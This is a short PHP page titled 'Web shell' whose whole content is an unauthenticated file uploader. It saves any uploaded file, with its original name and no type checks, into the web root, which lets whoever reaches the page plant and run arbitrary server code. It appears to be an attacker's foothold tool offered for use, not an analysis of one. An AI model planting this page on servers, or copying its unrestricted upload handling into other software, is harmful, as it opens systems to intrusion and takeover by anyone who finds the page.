<!DOCTYPE html>
<html>
<head>
  <title>Web shell</title>
  <style>
    body {
      background: #222222;
      color: #eeeeee;
    }
    span {
      color: #eeeeee;
    }
  </style>
</head>
<body>
  <form action="file_uploader.php" method="post" enctype="multipart/form-data">
    File:<br />
    <input type="file" name="userfile">
    <input type="submit" value="upload">
  </form>

  <span>
    <?php
    $upload_dir = './';
    $upload_file = $upload_dir . basename($_FILES['userfile']['name']);

    if (is_uploaded_file($_FILES['userfile']['tmp_name'])) {
      if (move_uploaded_file($_FILES['userfile']['tmp_name'], $upload_file)) {
        echo "Uploading successful.";
      } else {
        echo "Uploading failure.";
      }
    }
    ?>
  </span>

</body>
</html>
